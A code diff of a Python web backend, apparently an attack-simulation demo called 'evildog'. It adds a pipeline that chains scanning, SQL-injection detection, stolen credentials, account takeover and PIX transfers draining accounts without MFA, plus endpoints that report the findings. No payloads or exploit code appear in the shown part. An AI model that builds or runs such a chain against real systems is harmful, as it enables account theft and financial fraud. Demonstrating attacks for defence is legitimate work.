+        # TRANSFER consumes the authenticated account ids from ATO.
+        st = _stage("TRANSFER", "TRANSFER")
+        ato_artifact = _require_stage_artifact(context, "ATO", "sessions")
+        res = _run_transfer(ato_artifact["sessions"], amount=1.0)
+        _dwell(st)
+        transfer_public = {
+            "summary": f"R$ {res['total']:.2f} em {res['drained_ok']} PIX aceitos",
+            "sessions_received": len(ato_artifact["sessions"]),
+            "pix_accepted": res["drained_ok"],
+            "total": res["total"],
+            "destination": res["to"],
+        }
+        _complete_stage(
+            context, "TRANSFER", "REPORT", {"result": res}, transfer_public,
+            f"[TRANSFER] R$ {res['total']:.2f} de {res['drained_ok']} conta(s) usando sessões do ATO",
+        )
+
+        report_public = {
+            "summary": f"cadeia comprovada em {len(API_STATE['pipeline']['transitions'])} handoffs",
+            "handoffs": list(API_STATE["pipeline"]["transitions"]),
+            "pix_total": res["total"],
+            "accounts_drained": res["drained_ok"],
+            "mfa_protected": ato["mfa_protected"],
+        }
+        _complete_stage(
+            context, "REPORT", None, {"report": report_public}, report_public,
+            f"[REPORT] cadeia: host → serviço → campo → finding → payload → credencial → "
+            f"sessão → PIX · R$ {res['total']:.2f} · {ato['mfa_protected']} com MFA resistiram",
+        )
         detail = "[REPORT] pipeline concluído — salami com credencial roubada (contas sem MFA)"
         _finish_pipeline_state("done", "SUCCESS", detail)
         bus.publish({"type": "pipeline", "state": "done", "run_id": run_id, "source_ip": src,
@@ -1998,6 +2405,8 @@ async def reset_demo_state():
         "detail": None,
         "started_at": None,
         "finished_at": None,
+        "artifacts": {},
+        "transitions": [],
     })
     for key in attacker.stats:
         attacker.stats[key] = 0
@@ -2099,6 +2508,28 @@ async def loot():
 
 @app.get("/api/evildog/scan")
 async def scan():
+    pipeline = _pipeline_snapshot()
+    scan_artifact = (pipeline.get("artifacts") or {}).get("SCAN")
+    if scan_artifact:
+        services = scan_artifact.get("services") or []
+        candidates = scan_artifact.get("candidates") or []
+        opportunities = [{
+            **candidate,
+            "category": "SQL Injection candidate",
+            "severity": "critical",
+            "detail": (f"{candidate.get('method', 'GET')} {candidate.get('path', '')} · "
+                       f"parâmetro {candidate.get('parameter', '?')} · probe HTTP "
+                       f"{candidate.get('probe_status', '?')}"),
+        } for candidate in candidates]
+        return {
+            "target": _urlparse(_base()).hostname or TARGET_LABEL,
+            "opportunities": opportunities,
+            "open_ports": services,
+            "attack_surface": len(candidates),
+            "evidence_source": "pipeline",
+            "run_id": pipeline.get("run_id"),
+            "summary": scan_artifact.get("summary"),
+        }
     host = _urlparse(_base()).hostname or TARGET_LABEL
     return {
         "target": host,
@@ -2109,17 +2540,50 @@ async def scan():
             {"port": 443, "service": "https"}, {"port": 1389, "service": "ldap (callback)"},
         ],
         "attack_surface": len(VECTORS),
+        "evidence_source": "catalog",
     }
 
 
 @app.get("/api/evildog/vulnerabilities")
 async def vulnerabilities():
+    pipeline = _pipeline_snapshot()
+    detect_artifact = (pipeline.get("artifacts") or {}).get("DETECT")
+    finding = (detect_artifact or {}).get("finding")
+    if finding:
+        dynamic = {
+            "id": "pipeline-sqli-finding",
+            "name": "SQL Injection confirmada pelo pipeline",
+            "label": "SQL Injection em parâmetro HTTP",
+            "severity": "critical",
+            "category": "injection",
+            "cwe": "CWE-89",
+            "path": finding.get("path"),
+            "endpoint": finding.get("path"),
+            "method": finding.get("method"),
+            "parameter": finding.get("parameter"),
+            "service": finding.get("host"),
+            "port": finding.get("port"),
+            "tool": finding.get("tool"),
+            "evidence": finding.get("evidence"),
+            "confirmed": bool(finding.get("vulnerable")),
+            "impact": (f"O parâmetro {finding.get('parameter', '?')} alterou a consulta: "
+                       f"predicado verdadeiro retornou "
+                       f"{(finding.get('evidence') or {}).get('true_records', 0)} registros."),
+        }
+        return {
+            "vulnerabilities": [dynamic],
+            "total": 1,
+            "by_severity": {"critical": 1},
+            "evidence_source": "pipeline",
+            "run_id": pipeline.get("run_id"),
+        }
     order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
     vulns = sorted(VECTORS, key=lambda v: order.get(v["severity"], 9))
     counts = {}
     for v in vulns:
         counts[v["severity"]] = counts.get(v["severity"], 0) + 1
-    return {"vulnerabilities": vulns, "total": len(vulns), "by_severity": counts}
+    return {"vulnerabilities": vulns, "total": len(vulns), "by_severity": counts,
+            "evidence_source": "catalog"}
 
 
 @app.get("/api/evildog/report")
@@ -2148,6 +2612,11 @@ async def report():
         "systems": sorted(API_STATE["compromised"]),
         "vulnerabilities": vulns,
         "case_study": SALAMI_CASES,
+        "pipeline_evidence": {
+            "run_id": API_STATE["pipeline"].get("run_id"),
+            "artifacts": dict(API_STATE["pipeline"].get("artifacts") or {}),
+            "transitions": list(API_STATE["pipeline"].get("transitions") or []),
+        },
     }
 
 
